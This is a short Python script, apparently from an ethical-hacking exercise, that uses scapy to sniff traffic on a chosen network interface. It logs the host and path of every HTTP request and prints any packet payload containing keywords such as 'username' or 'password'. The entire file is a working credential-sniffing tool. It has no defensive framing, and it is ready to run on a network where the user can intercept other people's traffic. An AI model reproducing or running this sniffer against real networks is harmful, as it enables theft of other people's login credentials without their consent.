#! /bin/python
import argparse
import scapy.all as scapy
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="Desired interface.")
    args = parser.parse_args()
    interface = args.interface
    if not args.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")
    else:
        return(interface)

def sniff(interface):
    print("[+] Starting scan.")
    scapy.sniff(iface=interface,store=False,prn=process_packet)

def process_packet(packet):
    print(packet.show())
    if packet.haslayer(http.HTTPRequest):
        get_url(packet)
        if packet.haslayer(scapy.Raw):
            get_login_info(packet)

def get_url(packet):
    url=(bytes(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode())
    if url:
        print("[+] HTTP Request >> " + url)
    return

def get_login_info(packet):
    keywords = ["username","uname","user","login","password","pass"]
    load = packet[scapy.Raw].load.decode()
    for keyword in keywords:
        if keyword in load:
            print("[+] Possible username/password >> " + load)
            return

def main():
    interface = get_interface()
    sniff(interface)
    print("\n[+] Programme exited successfully.")

main()
